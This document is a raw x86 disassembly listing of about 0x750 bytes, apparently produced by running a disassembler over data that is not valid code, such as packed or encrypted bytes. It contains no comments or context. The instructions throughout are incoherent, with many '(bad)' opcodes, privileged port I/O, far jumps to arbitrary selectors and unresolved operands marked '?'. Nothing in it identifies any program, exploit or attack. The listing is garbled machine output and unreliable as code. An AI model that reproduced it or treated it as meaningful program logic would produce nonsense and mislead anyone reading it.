  41d642:	mov    al,ds:0x797f1f40
  41d647:	pop    ss
  41d648:	and    bl,BYTE PTR [edi+0x2d11fd9a]
  41d64e:	lahf   
  41d64f:	add    ch,BYTE PTR [edx]
  41d651:	sbb    al,0xd1
  41d653:	scas   al,BYTE PTR es:[edi]
  41d654:	lods   eax,DWORD PTR ds:[esi]
  41d655:	loopne 0x41d5ed
  41d657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d658:	hlt    
  41d659:	test   eax,0x349f28bc
  41d65e:	xchg   BYTE PTR [eax-0x10],dh
  41d661:	push   0xfffffff3
  41d663:	or     BYTE PTR [edx+ecx*4-0x7a4e4de6],bl
  41d66a:	pop    ecx
  41d66b:	xchg   edx,eax
  41d66c:	(bad)  
  41d66d:	push   0xffffffa1
  41d66f:	or     al,0x38
  41d671:	xchg   ebx,ebx
  41d673:	(bad)  
  41d675:	mov    ebx,0x9e636d04
  41d67a:	out    0xe8,eax
  41d67c:	in     eax,0x2d
  41d67e:	or     eax,0x722ed02e
  41d683:	inc    edi
  41d685:	inc    ecx
  41d686:	and    eax,0x9bfc9516
  41d68b:	imul   eax,DWORD PTR [edx],0x623fabda
  41d691:	ja     0x41d6f5
  41d693:	rcr    edx,1
  41d695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d696:	inc    edi
  41d697:	leave  
  41d698:	and    bh,dh
  41d69a:	jle    0x41d703
  41d69c:	test   al,0x5f
  41d69e:	cmc    
  41d69f:	inc    esi
  41d6a0:	xor    eax,0x23efa7a9
  41d6a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6a6:	dec    edx
  41d6a7:	mov    WORD PTR [esi-0x56eecf48],es
  41d6ad:	or     dl,BYTE PTR [ecx-0x33]
  41d6b0:	mov    esp,0x7f2768cf
  41d6b5:	enter  0xe601,0x3c
  41d6b9:	mov    ebp,DWORD PTR [ecx+0x5c]
  41d6bc:	sbb    al,0x2d
  41d6be:	(bad)  [eax+0x55]
  41d6c1:	popa   
  41d6c2:	fs sti 
  41d6c4:	pop    edx
  41d6c5:	int3   
  41d6c6:	call   0x188e:0x34b9e699
  41d6cd:	mov    al,0x9f
  41d6cf:	inc    esp
  41d6d0:	in     eax,0x28
  41d6d2:	pop    edx
  41d6d3:	jg     0x41d722
  41d6d5:	cwde   
  41d6d6:	std    
  41d6d7:	cdq    
  41d6d8:	add    DWORD PTR [esi+0x7b],edx
  41d6db:	pop    es
  41d6dc:	push   ss
  41d6dd:	mov    ss,WORD PTR [ecx+0x52]
  41d6e0:	sbb    al,0x6f
  41d6e2:	xchg   sp,bx
  41d6e5:	push   es
  41d6e6:	scas   eax,DWORD PTR es:[edi]
  41d6e7:	sahf   
  41d6e8:	stos   BYTE PTR es:[edi],al
  41d6e9:	jecxz  0x41d6dd
  41d6eb:	(bad)  
  41d6ec:	pop    ss
  41d6ed:	test   DWORD PTR [edi],0x74bd6814
  41d6f3:	ds inc ebx
  41d6f5:	cmp    BYTE PTR [esi],ah
  41d6f7:	jle    0x41d70a
  41d6f9:	arpl   WORD PTR [edi+0x64],sp
  41d6fc:	icebp  
  41d6fd:	or     al,0xed
  41d6ff:	jnp    0x41d6d9
  41d701:	jnp    0x41d74d
  41d703:	shl    BYTE PTR [eax],0x20
  41d706:	pop    esp
  41d707:	cmp    bh,dh
  41d709:	loopne 0x41d712
  41d70b:	add    al,0xed
  41d70d:	into   
  41d70e:	jne    0x41d702
  41d710:	imul   edx,DWORD PTR ds:0x6d6e76a3,0x68
  41d717:	jae    0x41d6e9
  41d719:	outs   dx,BYTE PTR ds:[esi]
  41d71a:	add    ecx,DWORD PTR [edi-0x2e935c88]
  41d720:	push   esi
  41d721:	and    eax,0xcd175fdc
  41d726:	mov    ecx,0x7e3f3b4a
  41d72b:	xor    al,0x3a
  41d72d:	jmp    0x41d754
  41d72f:	jmp    0xc504:0x29f0c171
  41d736:	mov    eax,ds
  41d738:	mov    gs,WORD PTR [edi-0x25]
  41d73b:	push   ds
  41d73c:	sub    eax,0x1dc88e33
  41d741:	inc    eax
  41d742:	mov    cl,0x55
  41d744:	mov    ch,cl
  41d746:	leave  
  41d747:	or     eax,0x4e757d73
  41d74c:	ja     0x41d6fc
  41d74e:	pop    ecx
  41d74f:	and    ebp,ecx
  41d751:	stos   DWORD PTR es:[edi],eax
  41d752:	mov    esi,0x465ddb86
  41d757:	neg    DWORD PTR ds:0x9187cafb
  41d75d:	(bad)  
  41d75f:	cmc    
  41d760:	stos   DWORD PTR es:[edi],eax
  41d761:	pop    ss
  41d762:	pusha  
  41d763:	loope  0x41d777
  41d765:	mov    cs,WORD PTR [ebp-0x5db6a4cc]
  41d76b:	pop    ebp
  41d76c:	and    cl,BYTE PTR [eax]
  41d76e:	fnstcw WORD PTR [ebx]
  41d770:	icebp  
  41d771:	add    DWORD PTR [ebx],esp
  41d773:	cld    
  41d774:	lea    esi,[ebx-0x274b8b28]
  41d77a:	pop    es
  41d77b:	cmp    BYTE PTR [ebx],0xe2
  41d77e:	popf   
  41d77f:	in     al,0xa4
  41d781:	mov    ecx,0xcf6007e5
  41d786:	fs loopne 0x41d73d
  41d789:	in     al,0x82
  41d78b:	fidivr WORD PTR ds:0xbfdc7200
  41d791:	jo     0x41d812
  41d793:	shl    bl,1
  41d795:	mov    ds:0x44507db6,eax
  41d79a:	cmp    DWORD PTR [edx],ebx
  41d79c:	push   cs
  41d79d:	pop    ecx
  41d79e:	into   
  41d79f:	jbe    0x41d7ac
  41d7a1:	fdiv   DWORD PTR [esi-0x6c]
  41d7a4:	dec    esi
  41d7a5:	popf   
  41d7a6:	xchg   esi,eax
  41d7a7:	ins    DWORD PTR es:[edi],dx
  41d7a8:	sub    DWORD PTR ss:[esi+eiz*4-0x31afeac],esp
  41d7b0:	stos   BYTE PTR es:[edi],al
  41d7b1:	mov    ah,0x76
  41d7b3:	hlt    
  41d7b4:	or     edi,edi
  41d7b6:	adc    eax,0xfa829404
  41d7bb:	dec    ebp
  41d7bc:	imul   ecx,DWORD PTR [ebx-0x3a],0x3b2b5ad1
  41d7c3:	js     0x41d844
  41d7c5:	fcomp  QWORD PTR [ecx-0x1b5617f]
  41d7cb:	(bad)  
  41d7cc:	sti    
  41d7cd:	inc    eax
  41d7ce:	add    dh,BYTE PTR [edi+0x10]
  41d7d1:	mov    ecx,0xed176837
  41d7d6:	push   ss
  41d7d7:	mov    DWORD PTR [eax],0x46fbe6bc
  41d7dd:	push   cs
  41d7de:	add    ah,BYTE PTR [ebp+eiz*1-0x26]
  41d7e2:	adc    esi,edi
  41d7e4:	jge    0x41d832
  41d7e6:	scas   al,BYTE PTR es:[edi]
  41d7e7:	nop
  41d7e8:	mov    BYTE PTR [ebx+0x38],bl
  41d7eb:	(bad)  
  41d7ed:	xchg   ebx,eax
  41d7ee:	xor    edi,DWORD PTR [edx+eiz*2+0x2e]
  41d7f2:	popa   
  41d7f3:	or     edi,edi
  41d7f5:	lods   al,BYTE PTR ds:[esi]
  41d7f6:	xchg   ebx,ebx
  41d7f8:	inc    edx
  41d7f9:	sub    al,0x61
  41d7fb:	and    dl,0xc
  41d7fe:	dec    al
  41d800:	inc    esi
  41d801:	aas    
  41d802:	fst    QWORD PTR [ebp-0x5d]
  41d805:	es adc al,cl
  41d808:	call   FWORD PTR [ebx]
  41d80a:	retf   
  41d80b:	xor    DWORD PTR [esi-0x65],0xffffffd0
  41d80f:	sbb    BYTE PTR [edi+0x5c0656b8],dh
  41d815:	into   
  41d816:	sbb    BYTE PTR [edi-0x609ebf7b],0x22
  41d81d:	and    esp,DWORD PTR [esi-0x56]
  41d820:	iret   
  41d821:	xchg   al,bh
  41d823:	test   BYTE PTR [esi-0x302aa3f5],al
  41d829:	jg     0x41d82e
  41d82b:	rcl    DWORD PTR [esi+0x66],1
  41d82e:	retf   
  41d82f:	not    DWORD PTR [ebp-0x57852c46]
  41d835:	lock push ebp
  41d837:	dec    ebp
  41d838:	inc    ecx
  41d839:	(bad)  
  41d83a:	outs   dx,BYTE PTR ds:[esi]
  41d83b:	xchg   ebp,eax
  41d83c:	or     DWORD PTR [eax],esi
  41d83e:	xor    BYTE PTR [ebp+0x221d2edd],0x37
  41d845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d846:	inc    ecx
  41d847:	mov    eax,ds:0x1a570ba
  41d84c:	xor    BYTE PTR [edx+edx*8+0xbef2c01],0x1d
  41d854:	sub    eax,0x9498c212
  41d859:	pop    edi
  41d85a:	cdq    
  41d85b:	pop    edx
  41d85c:	inc    esi
  41d85d:	and    ecx,edx
  41d85f:	push   edx
  41d860:	mov    bl,0xee
  41d862:	aam    0x3e
  41d864:	ins    DWORD PTR es:[edi],dx
  41d865:	popa   
  41d866:	leave  
  41d867:	pop    edi
  41d868:	inc    ecx
  41d869:	and    edx,DWORD PTR ds:[edx-0x63f55faf]
  41d870:	add    ah,BYTE PTR [edx+0x4e776cb8]
  41d876:	mov    bh,0xb2
  41d878:	mov    bl,0xfe
  41d87a:	push   0x4d
  41d87c:	loop   0x41d890
  41d87e:	mov    ds:0xcb763728,al
  41d883:	fadd   QWORD PTR [ecx-0x4a11cd6e]
  41d889:	mov    esp,0x45d6c7f7
  41d88e:	and    BYTE PTR [edi+eiz*4+0x2f27ffa8],ch
  41d895:	cmp    DWORD PTR [eax-0x6bae0c65],0x5d
  41d89c:	fimul  DWORD PTR [ebx]
  41d89e:	dec    ebp
  41d89f:	retf   0x2cf7
  41d8a2:	cdq    
  41d8a3:	xchg   esp,eax
  41d8a4:	mov    ds:0xbae994ec,eax
  41d8a9:	mov    edx,0x54790b41
  41d8ae:	outs   dx,BYTE PTR ds:[esi]
  41d8af:	retf   0xb0b4
  41d8b2:	fst    DWORD PTR [esi-0x47d623a3]
  41d8b8:	scas   eax,DWORD PTR es:[edi]
  41d8b9:	mov    dl,0x2d
  41d8bb:	daa    
  41d8bc:	js     0x41d89c
  41d8be:	lods   al,BYTE PTR ds:[esi]
  41d8bf:	jae    0x41d933
  41d8c1:	mov    al,0x82
  41d8c3:	sete   bh
  41d8c6:	sar    BYTE PTR [ecx],0x2e
  41d8c9:	sbb    BYTE PTR [ebp-0x27],al
  41d8cc:	add    BYTE PTR [edx*1-0x5ac97182],ah
  41d8d3:	leave  
  41d8d4:	sub    eax,0x1dcea57d
  41d8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8da:	xchg   ebp,eax
  41d8db:	fadd   DWORD PTR [eax+0x14]
  41d8de:	or     BYTE PTR [edx+edx*2-0x44],bl
  41d8e2:	fidiv  DWORD PTR ds:0xb9279e0
  41d8e8:	inc    esi
  41d8e9:	mov    BYTE PTR [ebp-0x6230130e],ch
  41d8ef:	in     al,0x5d
  41d8f1:	arpl   WORD PTR ds:0x6f1fbeea,si
  41d8f7:	push   edx
  41d8f8:	xor    BYTE PTR [edi-0x2],ah
  41d8fb:	bound  esp,QWORD PTR [eax+edx*2+0x26]
  41d8ff:	mov    ss:0xe0907d2,al
  41d905:	fcom   st(7)
  41d907:	xchg   edx,eax
  41d908:	sub    dl,ch
  41d90a:	xor    BYTE PTR es:[esp+ecx*8+0x520b09bd],0x5f
  41d913:	push   es
  41d914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d915:	mov    esp,0xeca677d
  41d91a:	lock (bad) 
  41d91c:	sub    eax,0x74067e92
  41d921:	or     al,BYTE PTR [eax+eax*2+0x15c0f73b]
  41d928:	repnz adc BYTE PTR fs:[edx-0x419cdfed],ah
  41d930:	in     al,dx
  41d931:	and    ecx,ebp
  41d933:	lods   al,BYTE PTR ds:[esi]
  41d934:	inc    edi
  41d935:	push   0x8f80c88e
  41d93a:	pop    ebp
  41d93b:	(bad)  [ebx-0xf]
  41d93e:	sbb    al,0x49
  41d940:	sti    
  41d941:	call   0x23a:0xb3cb5629
  41d948:	ins    DWORD PTR es:[edi],dx
  41d949:	sahf   
  41d94a:	add    ecx,ebp
  41d94c:	xchg   ebx,eax
  41d94d:	push   0x11
  41d94f:	mov    DWORD PTR [eax+edx*2+0x35],ecx
  41d953:	je     0x41d986
  41d955:	jbe    0x41d95b
  41d957:	push   edi
  41d958:	push   edi
  41d959:	mov    edi,0x5b5c8218
  41d95e:	lock jns 0x41d8e6
  41d961:	jae    0x41d956
  41d963:	pop    esp
  41d964:	fdivr  QWORD PTR [edx+0x3a3c5738]
  41d96a:	hlt    
  41d96b:	push   ecx
  41d96c:	dec    ebx
  41d96d:	sbb    dh,0xd5
  41d970:	jl     0x41d90d
  41d972:	jge    0x41d9ca
  41d974:	xchg   edi,eax
  41d975:	dec    ebx
  41d976:	ss test eax,0xa2b23014
  41d97c:	arpl   WORD PTR [esi],cx
  41d97e:	sub    BYTE PTR [eax],al
  41d980:	xor    eax,0x6a2173c2
  41d985:	lods   al,BYTE PTR es:[esi]
  41d987:	out    dx,eax
  41d988:	mov    cl,0x98
  41d98a:	adc    eax,0x582c4b1a
  41d98f:	inc    ebp
  41d990:	fldcw  WORD PTR [ebp-0x4ba79722]
  41d996:	fstp   QWORD PTR [ebx-0xd]
  41d999:	mov    ds:0xa2ed39dc,eax
  41d99e:	fisub  WORD PTR [edi-0x2e2b35b3]
  41d9a4:	cmp    esi,ecx
  41d9a6:	and    edx,esi
  41d9a8:	or     ecx,DWORD PTR [edi+0x40c573bf]
  41d9ae:	aad    0xe7
  41d9b0:	push   eax
  41d9b1:	push   eax
  41d9b2:	sar    DWORD PTR [edi],0xc0
  41d9b5:	mov    ss,edx
  41d9b7:	jbe    0x41d9fc
  41d9b9:	sti    
  41d9ba:	pop    ss
  41d9bb:	jb     0x41d9de
  41d9bd:	jbe    0x41da1f
  41d9bf:	daa    
  41d9c0:	jp     0x41d9c3
  41d9c2:	xchg   ebp,eax
  41d9c3:	add    bl,BYTE PTR [ebp+0x237fa4cd]
  41d9c9:	popa   
  41d9ca:	in     eax,dx
  41d9cb:	imul   ebp,DWORD PTR [esi],0xd8b58dd4
  41d9d1:	mov    BYTE PTR ds:0x7c3fc01f,dl
  41d9d7:	xchg   ecx,eax
  41d9d8:	and    al,0x2f
  41d9da:	test   eax,0xfbde81c3
  41d9df:	push   cs
  41d9e0:	pop    edx
  41d9e1:	call   0xef2f1443
  41d9e6:	mov    ds:0xe5cb44fc,eax
  41d9eb:	leave  
  41d9ec:	out    0x67,al
  41d9ee:	out    dx,al
  41d9ef:	fs stc 
  41d9f1:	adc    DWORD PTR [edx],esp
  41d9f3:	xor    edx,edi
  41d9f5:	(bad)  
  41d9f7:	mov    ebp,0xebd32861
  41d9fc:	in     eax,0x68
  41d9fe:	add    edx,DWORD PTR [eax-0x75]
  41da01:	je     0x41da5e
  41da03:	cmp    DWORD PTR [eax*4+0x1b4fc246],esp
  41da0a:	call   DWORD PTR [ecx-0x24a680ca]
  41da10:	or     esi,DWORD PTR [esi+edi*8-0x68114d0a]
  41da17:	xchg   esp,eax
  41da18:	xchg   eax,eax
  41da1a:	mov    ecx,0x36823249
  41da1f:	popf   
  41da20:	xchg   edx,eax
  41da21:	and    dh,BYTE PTR [edx]
  41da23:	add    DWORD PTR [edx],ebx
  41da25:	inc    eax
  41da26:	in     al,0x97
  41da28:	jnp    0x41da6d
  41da2a:	push   eax
  41da2b:	xchg   ebx,eax
  41da2c:	or     ecx,DWORD PTR [esi]
  41da2e:	adc    BYTE PTR [edi],0xde
  41da31:	jnp    0x41da91
  41da33:	pop    ebp
  41da34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da35:	push   esi
  41da36:	xchg   ebx,eax
  41da37:	hlt    
  41da38:	push   ebx
  41da39:	jno    0x41d9c7
  41da3b:	push   0xa063f02f
  41da40:	daa    
  41da41:	imul   ebx,DWORD PTR [edx+0x50],0x14830389
  41da48:	xchg   ebx,eax
  41da49:	push   edx
  41da4a:	and    bh,bl
  41da4c:	(bad)  
  41da4d:	pop    esi
  41da4e:	push   ss
  41da4f:	cld    
  41da50:	xchg   ebx,eax
  41da51:	mov    ch,0x43
  41da53:	dec    eax
  41da54:	enter  0xe46f,0x2e
  41da58:	mov    ch,0xa
  41da5a:	je     0x41da56
  41da5c:	add    edi,DWORD PTR [ebp-0x63]
  41da5f:	push   0x43f1631f
  41da64:	out    dx,eax
  41da65:	retf   0x52fe
  41da68:	enter  0xe681,0x92
  41da6c:	inc    edi
  41da6d:	sti    
  41da6e:	call   FWORD PTR [edi-0x7ce072dc]
  41da74:	cld    
  41da75:	std    
  41da76:	shl    BYTE PTR [edx+0x55],1
  41da79:	cmp    eax,0xced2e286
  41da7e:	lods   eax,DWORD PTR ds:[esi]
  41da7f:	sbb    ebp,ecx
  41da81:	push   ebx
  41da82:	xchg   esp,eax
  41da83:	pop    edi
  41da84:	jb     0x41db05
  41da86:	dec    esi
  41da87:	adc    esp,edi
  41da89:	adc    eax,0xcff18c77
  41da8e:	pop    ebx
  41da8f:	push   ds
  41da90:	sbb    ebp,DWORD PTR [ecx+ebx*4]
  41da93:	jmp    DWORD PTR [edx+0x4d]
  41da96:	and    DWORD PTR [edi+0x2b0e476f],esp
  41da9c:	out    dx,eax
  41da9d:	xor    BYTE PTR [edx+0x21],al
  41daa0:	add    al,0x8a
  41daa2:	pushf  
  41daa3:	dec    edx
  41daa4:	push   ds
  41daa5:	mov    BYTE PTR [ebp-0x17b5e953],dl
  41daab:	ret    0x28ff
  41daae:	pop    edx
  41daaf:	lahf   
  41dab0:	scas   eax,DWORD PTR es:[edi]
  41dab1:	rcl    bl,cl
  41dab3:	dec    esi
  41dab4:	inc    esp
  41dab5:	pop    esi
  41dab6:	outs   dx,BYTE PTR ds:[esi]
  41dab7:	into   
  41dab8:	out    dx,al
  41dab9:	jbe    0x41da4f
  41dabb:	mov    edi,0xa9567d71
  41dac0:	and    BYTE PTR [edx-0x2f],dl
  41dac3:	xor    DWORD PTR [ecx-0x46],ebp
  41dac6:	dec    ebx
  41dac7:	ins    BYTE PTR es:[edi],dx
  41dac8:	sub    eax,ebp
  41daca:	scas   eax,DWORD PTR es:[edi]
  41dacb:	jp     0x41db3f
  41dacd:	add    al,0x94
  41dacf:	jmp    0x41da52
  41dad1:	push   esi
  41dad2:	mov    eax,ds:0x25efaec9
  41dad7:	int3   
  41dad8:	imul   eax,DWORD PTR [ecx-0x1ae921b5],0xffffffe5
  41dadf:	sets   BYTE PTR [ebp+0x54]
  41dae3:	dec    esi
  41dae4:	lahf   
  41dae5:	das    
  41dae6:	les    eax,FWORD PTR [ebx-0x5fb04b9b]
  41daec:	mov    DWORD PTR [esi],esp
  41daee:	jp     0x41daf1
  41daf0:	adc    DWORD PTR [eax-0x43f6369f],edx
  41daf6:	jg     0x41db72
  41daf8:	jge    0x41da83
  41dafa:	xchg   DWORD PTR gs:[ecx-0x52],edi
  41dafe:	stos   DWORD PTR es:[edi],eax
  41daff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db00:	pop    edx
  41db01:	aad    0x22
  41db03:	xor    eax,0xc1e97786
  41db08:	aam    0xd2
  41db0a:	cwde   
  41db0b:	mov    ah,0x15
  41db0d:	xchg   esp,eax
  41db0e:	cmc    
  41db0f:	mov    cl,0x27
  41db11:	pop    edx
  41db12:	mov    esp,0x3a248caf
  41db17:	out    dx,eax
  41db18:	ja     0x41db96
  41db1a:	mov    edx,0x1514db8
  41db1f:	dec    ecx
  41db20:	loope  0x41dafc
  41db22:	jo     0x41db2d
  41db24:	int3   
  41db25:	inc    eax
  41db26:	scas   ax,WORD PTR es:[edi]
  41db28:	imul   esi,ebx,0x52
  41db2b:	test   esi,edx
  41db2d:	out    0x5a,eax
  41db2f:	jg     0x41db88
  41db31:	enter  0xa967,0x7d
  41db35:	call   0x415ff59c
  41db3a:	dec    ebx
  41db3b:	and    ah,BYTE PTR ds:0xc6ff2130
  41db41:	or     BYTE PTR [esi-0x5f],ah
  41db44:	push   ebp
  41db45:	popa   
  41db46:	mov    ebp,0x25ed995b
  41db4b:	call   0x8923:0xdd83a60b
  41db52:	push   esp
  41db53:	and    DWORD PTR [edx],esp
  41db55:	xchg   ecx,eax
  41db56:	js     0x41db32
  41db58:	hlt    
  41db59:	push   0xffffff8b
  41db5b:	or     dl,dl
  41db5d:	jp     0x41db3f
  41db5f:	add    ch,al
  41db61:	pusha  
  41db62:	mov    ?,eax
  41db64:	xor    al,0xae
  41db66:	out    0x5a,al
  41db68:	jae    0x41daed
  41db6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db6b:	sub    DWORD PTR ds:0x5e2fe69b,edx
  41db71:	shl    ebx,1
  41db73:	jmp    0xf7cb:0x10145f8e
  41db7a:	fcom   DWORD PTR [ebp-0x4ba0f2f6]
  41db80:	cmp    BYTE PTR [edi-0x57],bl
  41db83:	fidiv  DWORD PTR [edx]
  41db85:	jmp    0x41dba1
  41db87:	or     dh,BYTE PTR [eax+0x65]
  41db8a:	jae    0x41db3e
  41db8c:	fsubp  st(3),st
  41db8e:	data16 (bad) 
  41db90:	imul   esi,ebp,0xfffffff4
  41db93:	mov    dl,0x26
  41db95:	sub    al,0xc5
  41db97:	or     ch,BYTE PTR [ebx]
  41db99:	loopne 0x41db42
  41db9b:	xchg   esp,eax
  41db9c:	mov    es,WORD PTR [ecx-0x69ff4877]
  41dba2:	adc    ebx,ebx
  41dba4:	xchg   BYTE PTR [eax-0xbfb45ed],ch
  41dbaa:	ja     0x41db58
  41dbac:	fsubr  QWORD PTR [ecx]
  41dbae:	mov    ds:0x29f14c0c,al
  41dbb3:	scas   al,BYTE PTR es:[edi]
  41dbb4:	or     ebx,ecx
  41dbb6:	fimul  WORD PTR [edi-0x4b6c6d66]
  41dbbc:	pop    ss
  41dbbd:	push   ecx
  41dbbe:	and    eax,0xeb784cb4
  41dbc3:	mov    ds:0x691a52a9,al
  41dbc8:	into   
  41dbc9:	jl     0x41dba5
  41dbcb:	pop    edx
  41dbcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbcd:	dec    esp
  41dbce:	js     0x41dc3b
  41dbd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbd1:	mov    ss,WORD PTR [edi+0x1844b2a6]
  41dbd7:	lds    ecx,FWORD PTR [ebx]
  41dbd9:	and    BYTE PTR [ebp+eiz*4-0x7d42e55],bl
  41dbe0:	mov    bh,0xad
  41dbe2:	cwde   
  41dbe3:	xchg   ecx,eax
  41dbe4:	push   edx
  41dbe5:	sbb    ch,BYTE PTR [eax+0x55]
  41dbe8:	(bad)  
  41dbe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbea:	enter  0xcd1f,0x79
  41dbee:	ret    0xb15b
  41dbf1:	in     al,dx
  41dbf2:	cld    
  41dbf3:	loope  0x41dbcb
  41dbf5:	push   edx
  41dbf6:	jno    0x41dc0b
  41dbf8:	xor    ebx,ebx
  41dbfa:	and    DWORD PTR [esp+ebx*8-0x55],esi
  41dbfe:	es inc esp
  41dc00:	cs push ds
  41dc02:	or     al,0x6a
  41dc04:	xlat   BYTE PTR ds:[ebx]
  41dc05:	push   cs
  41dc06:	or     DWORD PTR ds:0xd922cdda,esp
  41dc0c:	ss push edi
  41dc0e:	jecxz  0x41dc3d
  41dc10:	inc    ebx
  41dc11:	inc    ecx
  41dc12:	test   DWORD PTR [edi+0x667478b1],esp
  41dc18:	aaa    
  41dc19:	push   edx
  41dc1a:	je     0x41dc8a
  41dc1c:	adc    bl,BYTE PTR [edi]
  41dc1e:	shl    DWORD PTR [bx+si-0x6f3f],cl
  41dc23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc24:	(bad)  
  41dc25:	mov    ecx,DWORD PTR [esp+esi*8]
  41dc28:	adc    eax,0x44c1016e
  41dc2d:	mov    dh,0xaa
  41dc2f:	shr    DWORD PTR [ecx+edx*2],cl
  41dc32:	mov    ds:0xe9471ed0,al
  41dc37:	push   edi
  41dc38:	inc    ecx
  41dc39:	retf   0x734b
  41dc3c:	mov    dl,0x3f
  41dc3e:	js     0x41dca6
  41dc40:	and    ebp,edi
  41dc42:	int    0xc7
  41dc44:	or     al,0x76
  41dc46:	stc    
  41dc47:	out    0x55,al
  41dc49:	cmp    DWORD PTR [ecx+0x59d7413f],0xffffffad
  41dc50:	sbb    BYTE PTR ss:[edi+0x17ee2d1a],cl
  41dc57:	lods   al,BYTE PTR ds:[esi]
  41dc58:	xchg   esi,eax
  41dc59:	pop    edi
  41dc5a:	retf   
  41dc5b:	(bad)  
  41dc5c:	call   FWORD PTR [edx+0x1a3692eb]
  41dc62:	xor    eax,0x875ef252
  41dc67:	cmp    dl,BYTE PTR [edx+esi*1]
  41dc6a:	fwait
  41dc6b:	into   
  41dc6c:	out    0xab,al
  41dc6e:	ds sbb ch,cl
  41dc71:	fwait
  41dc72:	inc    eax
  41dc73:	adc    edi,DWORD PTR [ebx]
  41dc75:	test   ebp,edi
  41dc77:	lock inc ebp
  41dc79:	pop    esp
  41dc7a:	push   edx
  41dc7b:	inc    ecx
  41dc7c:	inc    edi
  41dc7d:	(bad)  
  41dc7e:	fmul   st,st(5)
  41dc80:	mov    ds:0x29eadf60,al
  41dc85:	sar    DWORD PTR [eax+0xbe2dd0f],1
  41dc8b:	sbb    BYTE PTR [ecx],al
  41dc8d:	lods   eax,DWORD PTR ds:[esi]
  41dc8e:	mov    dl,0x76
  41dc90:	es retf 0xa28b
  41dc94:	adc    al,0x8e
  41dc96:	sub    DWORD PTR [eax+0x4e418afb],edx
  41dc9c:	ret    0x68ce
  41dc9f:	aaa    
  41dca0:	adc    bh,BYTE PTR [eax+0x56]
  41dca3:	stc    
  41dca4:	or     DWORD PTR [edx],ebp
  41dca6:	addr16 mov ch,0x17
  41dca9:	jns    0x41dcd8
  41dcab:	(bad)  
  41dcac:	inc    edx
  41dcad:	mov    ebx,0x7352cedb
  41dcb2:	mov    dh,0xd4
  41dcb4:	and    al,0x65
  41dcb6:	(bad)  
  41dcb8:	sub    eax,DWORD PTR [esi+0x771918cf]
  41dcbe:	pop    es
  41dcbf:	stos   DWORD PTR es:[edi],eax
  41dcc0:	mov    al,0x6f
  41dcc2:	sub    eax,DWORD PTR [ecx+esi*2]
  41dcc5:	adc    BYTE PTR [ebp+0x38],cl
  41dcc8:	xchg   DWORD PTR [ecx+0x29],esp
  41dccb:	mov    WORD PTR [edi-0x485c95e2],gs
  41dcd1:	retf   0x647
  41dcd4:	mov    al,0x17
  41dcd6:	popa   
  41dcd7:	in     eax,0xeb
  41dcd9:	lods   eax,DWORD PTR ds:[esi]
  41dcda:	dec    ecx
  41dcdb:	ret    0xa806
  41dcde:	(bad)  
  41dcdf:	dec    ebx
  41dce0:	xor    DWORD PTR [eax+0x45],ebx
  41dce3:	cmp    ebx,DWORD PTR [edi+0x6adae63c]
  41dce9:	xchg   edx,eax
  41dcea:	pop    ss
  41dceb:	xlat   BYTE PTR ds:[ebx]
  41dcec:	ss push cs
  41dcee:	fwait
  41dcef:	cli    
  41dcf0:	sbb    cl,BYTE PTR [edx+ebx*8-0x80]
  41dcf4:	or     DWORD PTR [esp+ebp*1-0x5a],0xdac52b5c
  41dcfc:	rcr    DWORD PTR [esi],0xf1
  41dcff:	push   eax
  41dd00:	aaa    
  41dd01:	sub    eax,DWORD PTR [ebx-0x25]
  41dd04:	pop    esp
  41dd05:	xchg   ecx,eax
  41dd06:	pushf  
  41dd07:	inc    eax
  41dd08:	mov    ah,BYTE PTR ds:0xa33dee69
  41dd0e:	mov    edx,0xed15f54c
  41dd13:	or     DWORD PTR es:[edi-0x1e],ecx
  41dd17:	push   cs
  41dd18:	mov    WORD PTR [esi+0x4a],?
  41dd1b:	jno    0x41dcc1
  41dd1d:	ins    DWORD PTR es:[edi],dx
  41dd1e:	adc    edi,ebx
  41dd20:	jp     0x41dcf7
  41dd22:	test   edx,edx
  41dd24:	add    BYTE PTR [esi-0x5],ch
  41dd27:	stos   DWORD PTR es:[edi],eax
  41dd28:	cmp    dh,BYTE PTR [edx+ebx*8-0x7a78b069]
  41dd2f:	add    al,0xfc
  41dd31:	cmc    
  41dd32:	dec    eax
  41dd33:	ins    BYTE PTR es:[edi],dx
  41dd34:	lods   eax,DWORD PTR ds:[esi]
  41dd35:	shr    BYTE PTR [edx],0x3b
  41dd38:	inc    ecx
  41dd39:	and    edx,DWORD PTR [edx+edi*2]
  41dd3c:	inc    ebp
  41dd3d:	lahf   
  41dd3e:	inc    dl
  41dd40:	mov    al,0x16
  41dd42:	pop    edx
  41dd43:	out    dx,al
  41dd44:	jmp    ebx
  41dd46:	mov    ecx,DWORD PTR [ecx-0xc8480ca]
  41dd4c:	arpl   WORD PTR [ecx+0xc9141f8],di
  41dd52:	cwde   
  41dd53:	rcr    BYTE PTR [ebx],1
  41dd55:	fadd   st,st(3)
  41dd57:	sahf   
  41dd58:	enter  0xc099,0xa8
  41dd5c:	outs   dx,BYTE PTR ds:[esi]
  41dd5d:	adc    eax,0x968b3f89
  41dd62:	sub    ecx,DWORD PTR [ebx]
  41dd64:	in     eax,dx
  41dd65:	lods   eax,DWORD PTR ds:[esi]
  41dd66:	inc    esp
  41dd67:	test   eax,edx
  41dd69:	dec    edx
  41dd6a:	shl    cl,1
  41dd6c:	dec    esi
  41dd6d:	push   esi
  41dd6e:	jg     0x41dd03
  41dd70:	mov    ch,0xa9
  41dd72:	mov    cs,ecx
  41dd74:	jne    0x41dd26
  41dd76:	test   BYTE PTR [edx+0x2b518c2b],0xb6
  41dd7d:	cmp    BYTE PTR [esi-0x21],0x68
  41dd81:	lock jge 0x41dd68
  41dd84:	jbe    0x41dd8f
  41dd86:	(bad)  
  41dd87:	jge    0x41ddaa
